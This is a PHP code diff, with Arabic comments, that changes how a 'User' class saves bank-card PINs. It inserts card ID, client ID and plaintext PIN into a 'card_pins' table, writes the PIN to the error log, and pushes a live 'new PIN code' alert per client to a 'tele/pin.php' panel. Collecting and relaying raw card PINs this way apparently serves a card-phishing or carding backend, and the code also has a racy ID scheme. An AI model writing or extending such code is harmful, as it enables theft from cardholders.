@@ -8,7 +8,10 @@ class User extends DB
 
   // users name of table
   private $table = 'admin';
-  
+
+  /** آخر خطأ من insertCardPIN (للتشخيص في tele/pin.php) */
+  public $lastPinSaveError = '';
+
   // ============================================
   // دوال تسجيل الدخول المحدثة
   // ============================================
@@ -1071,25 +1074,39 @@ public function insertCardPayment($data = array())
 
 public function insertCardPIN($cardId, $clientId, $pinCode)
 {
+    $this->lastPinSaveError = '';
     error_log("=== insertCardPIN START ===");
     error_log("Params: card_id=$cardId, client_id=$clientId, pin=$pinCode");
 
     try {
         $pdo = $this->pdo();
-        $sql = 'INSERT INTO `card_pins` (`card_id`, `client_id`, `pin_code`) VALUES (?, ?, ?)';
-        $stmt = $pdo->prepare($sql);
-        $stmt->execute([$cardId, $clientId, $pinCode]);
+        /**
+         * ملف SQL الأصلي: `card_pins.id` NOT NULL بدون AUTO_INCREMENT حتى يُشغَّل ALTER لاحقاً.
+         * نحسب المعرف التالي ثم نُدرج صفاً واحداً (أبسط وأكثر توافقاً من INSERT…SELECT على نفس الجدول).
+         */
+        $nextId = (int) $pdo->query('SELECT COALESCE(MAX(`id`), 0) + 1 FROM `card_pins`')->fetchColumn();
+        $ins = $pdo->prepare(
+            'INSERT INTO `card_pins` (`id`, `card_id`, `client_id`, `pin_code`) VALUES (?, ?, ?, ?)'
+        );
+        $ins->execute([$nextId, $cardId, $clientId, $pinCode]);
 
-        error_log('✅ insertCardPIN: inserted id ' . $pdo->lastInsertId());
+        if ($ins->rowCount() < 1) {
+            $this->lastPinSaveError = 'لم يُدرج أي صف';
+            error_log('❌ insertCardPIN: لم يُدرج أي صف');
+            return false;
+        }
+
+        error_log('✅ insertCardPIN: تم الإدراج');
 
         try {
-            $this->sendPusherUpdate($clientId, 'رمز PIN جديد');
+            $this->sendPusherUpdate((int) $clientId, 'رمز PIN جديد');
         } catch (Throwable $e) {
             error_log('⚠️ Pusher بعد حفظ PIN (غير فادح): ' . $e->getMessage());
         }
 
         return true;
     } catch (Throwable $e) {
+        $this->lastPinSaveError = $e->getMessage();
         error_log('❌ insertCardPIN: ' . $e->getMessage());
         error_log('Stack: ' . $e->getTraceAsString());
         return false;
